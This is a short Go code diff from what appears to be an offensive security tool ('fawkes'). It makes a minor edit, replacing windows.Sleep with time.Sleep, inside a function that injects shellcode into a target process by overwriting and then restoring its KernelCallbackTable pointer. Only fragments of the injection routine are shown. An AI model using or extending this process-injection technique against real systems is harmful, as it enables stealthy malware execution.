@@ -21,6 +21,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"runtime"
+	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -519,7 +520,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	output += "[+] Shellcode should have executed!\n"
 
 	// Wait briefly for execution
-	windows.Sleep(1000)
+	time.Sleep(1000 * time.Millisecond)
 
 	// Step 13: Restore original KernelCallbackTable pointer
 	err = writeProcessMemoryPtr(hProcess, kernelCallbackTablePtrAddr, kernelCallbackTable)
